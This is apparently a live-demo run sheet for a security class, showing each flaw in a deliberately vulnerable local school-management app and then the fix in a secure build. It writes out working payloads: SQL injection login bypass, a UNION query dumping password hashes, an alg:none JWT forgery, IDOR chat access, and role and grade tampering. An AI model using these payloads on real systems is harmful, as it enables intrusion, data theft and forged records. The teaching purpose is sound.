# Live demo run sheet

A sequence for presenting each vulnerability, then the fix, in front of the class.
Keep two terminals and a browser open.

## Setup (before you start)

```bash
pip install -r requirements.txt

# Terminal A — vulnerable build
RESET_DB=1 python3 app.py                       # http://127.0.0.1:3000

# Terminal B — secure build (leave running to show the fix instantly)
RESET_DB=1 APP_MODE=secure PORT=3001 python3 app.py
```

Open <http://127.0.0.1:3000> in the browser.

For each item: **show it broken on :3000**, explain the one-line cause, then run the
**same request against :3001** to show it fixed. `V=http://127.0.0.1:3000` and
`S=http://127.0.0.1:3001`.

**Getting your token** (needed for the `curl` steps): after signing in, open the
browser dev-tools console and run `localStorage.token`, or grab it from a login call:

```bash
TOK=$(curl -s -X POST $V/api/login -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
```

Optional: point Burp Suite's proxy at the browser and repeat any request in
Repeater — good for showing the raw HTTP and editing the JWT.

---

## 1. SQL injection (login)

**Break:** on the login page enter username `admin'-- ` and any password → you're
admin. Or:

```bash
curl -s -X POST $V/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''-- ","password":"x"}'
```

**Explain:** the username is pasted into the SQL string; `--` comments out the
password check. Show `h_login` in `app.py`.

**Fix:** same request on `$S` → `401`. Show the `# SECURE` branch (bound parameter).

---

## 2. Insecure password storage + SQLi data theft

**Break:** as `alice` (token above), dump every password hash with a UNION on the
certifications endpoint:

```bash
curl -s -G "$V/api/certifications" -H "Authorization: Bearer $TOK" \
  --data-urlencode "student_id=0 UNION SELECT id,role,username,password_hash,hash_scheme,NULL,full_name FROM users"
```

Then crack one live:

```bash
python3 -c 'import hashlib;print(hashlib.md5(b"qwerty").hexdigest())'   # = carol's hash
```

**Explain:** unsalted MD5 → instant reversal; concatenated `student_id` → injection.

**Fix:** on `$S` the same payload returns `403`; show `sqlite3 sms_secure.db "SELECT
username,hash_scheme,salt FROM users"` → PBKDF2 + salt.

---

## 3. Broken JWT (token forgery)

**Break:** forge an admin token with no secret and hit the admin API:

```bash
FORGED=$(python3 - <<'PY'
import auth, json
h=auth.b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
p=auth.b64url_encode(json.dumps({"sub":4,"username":"alice","role":"admin"}).encode())
print(f"{h}.{p}.")
PY
)
curl -s "$V/api/admin/users" -H "Authorization: Bearer $FORGED"
```

(Or, in the browser, set the forged token with `localStorage.token = "<forged>"` in
the dev-tools console, reload, and open **Admin**.)

**Explain:** the server never checks the signature and accepts `alg:none`. Show
`jwt_decode_vuln`.

**Fix:** same token on `$S` → `401`. Show `jwt_decode_secure` (pin alg, verify HMAC,
check expiry).

---

## 4. IDOR — reading other people's private chats

This is the headline demo. As the student `alice`, open **Chat** and click any
conversation — the address bar shows `#chat?chat_users[0]=4&chat_users[1]=5` (your id
and the other person's).

**Break:** change those two ids in the address bar to `1` and `2` — the private
`admin` ↔ `prof_smith` conversation — and press Enter. You now read their secret:

```
… the grading portal master password is Adm1n_Gu@rd14n_2026 …
```

Same thing from the terminal:

```bash
curl -s "$V/api/chat?chat_users[0]=1&chat_users[1]=2" -H "Authorization: Bearer $TOK"
```

**Explain:** the endpoint returns whichever conversation the URL names, with no check
that you are one of the two participants.

**Fix:** on `$S`, `chat_users[0]=1&chat_users[1]=2` → `403`; your own conversation
(`4` & `5`) → `200`.

---

## 5. Privilege escalation (self-register as admin)

**Break:** on the register form set **Role = admin**, create the account, sign in →
admin. Or:

```bash
curl -s -X POST $V/api/register -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"x","role":"admin"}'
```

**Fix:** on `$S` the new account is always `student`.

---

## 6. Broken access control

**Break (grades):** as `alice`, self-assign a perfect grade (there is no gradebook in
the student UI — you call the API directly, which is the point):

```bash
curl -s -X POST $V/api/grades -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"course_id":1,"student_id":4,"grade":"20.00"}'
```

Reload the dashboard → the new grade is there.

**Break (fake diploma):** as `alice`, issue yourself a certificate:

```bash
curl -s -X POST $V/api/certifications -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"student_id":4,"title":"PhD in Computer Science","grade":"A+","issued_date":"2026-09-30"}'
```

**Fix:** both return `403` on `$S`; a professor can grade only their own course, and
only admins issue certificates.

---

## 7. Cryptography — signatures and encryption

**Signatures (the fake diploma from #6):** on `$V`, load Certifications → the fake
PhD shows **✔ valid** (no verification). On `$S`, real certs are **✔ valid**; now
tamper one in the DB and reload:

```bash
sqlite3 sms_secure.db "UPDATE certifications SET grade='A+' WHERE title='Python Developer';"
```

→ that certificate flips to **✘ INVALID** (Ed25519 signature no longer matches).
Show the public key at `$S/api/pubkey`.

**Encryption at rest:** compare the two databases:

```bash
sqlite3 sms_vuln.db   "SELECT subject, body FROM messages LIMIT 2;"   # plaintext
sqlite3 sms_secure.db "SELECT subject, body FROM messages LIMIT 2;"   # AES-GCM ciphertext
```

**Explain:** encryption protects the database file; access control (#4) protects the
API. You need both.

---

## 8. Blockchain integrity ledger (tamper detection)

Open **Blockchain** in the sidebar. The secure build anchors every grade and
certificate on a chain of SHA-256-linked blocks (each with a proof-of-work nonce);
the page shows the blocks, a green "Ledger intact" banner, and a grade-integrity
table where every row reads **✔ matches**.

**Break (vuln build, `$V`):** change a grade straight in the database — the app has
no way to notice:

```bash
sqlite3 sms_vuln.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
curl -s $V/api/grades/integrity -H "Authorization: Bearer $TOK"   # {"enforced": false}
```

**Fix 1 — tampering with the records is caught (`$S`).** Do the same edit on the
secure DB, then reload **Blockchain**: Mathematics now shows **DB 20.00 vs Ledger
14.00 → ✘ TAMPERED** while the ledger banner stays intact (the chain is the trusted
reference).

```bash
sqlite3 sms_secure.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
curl -s $S/api/grades/integrity -H "Authorization: Bearer $TOK"   # Mathematics ok:false
```

A certificate forged straight into the DB is caught twice — open **Certifications**:
it shows **✘ invalid** (no valid signature) **and** **⚠ not on chain**:

```bash
sqlite3 sms_secure.db "INSERT INTO certifications (student_id,title,grade,issued_date,signature) \
  VALUES (4,'PhD in Computer Science','A+','2026-01-01','ZmFrZXNpZw==');"
```

**Fix 2 — rewriting the ledger itself is caught (`$S`).** Try to edit history in a
block; the banner flips to **✘ Ledger BROKEN** and names the block:

```bash
sqlite3 sms_secure.db "UPDATE blockchain SET data=replace(data,'14.00','20.00') WHERE idx=1;"
curl -s $S/api/blockchain -H "Authorization: Bearer $TOK"   # valid:false, block 1 hash mismatch
```

**Explain:** signatures prove *who* issued a record; the ledger proves it *hasn't
changed since*. Editing a block changes its hash and breaks the link to the next
block, so the tampering can't be hidden. Re-seed to a clean state with
`RESET_DB=1 APP_MODE=secure PORT=3001 python3 app.py`.

---

## One-line recap for each fix

| Vuln | Root cause | Fix |
|------|-----------|-----|
| SQLi | string concatenation | bound parameters |
| Weak hashing | unsalted MD5 | PBKDF2 + salt |
| JWT forgery | signature not verified | verify HMAC, pin alg, check exp |
| IDOR | no ownership check | check sender/recipient/admin |
| Privesc | client sets role | server sets role |
| Access control | no role check | check role/ownership server-side |
| Crypto | plaintext + unsigned | AES-GCM at rest + Ed25519 signatures |
| Integrity | records trusted blindly | blockchain ledger: anchor on write, verify on read |

> If you prefer to patch live instead of switching ports: open `app.py` / `auth.py`,
> change the `# VULN` line to the `# SECURE` line shown right beside it, restart
> Terminal A, and re-run the request.
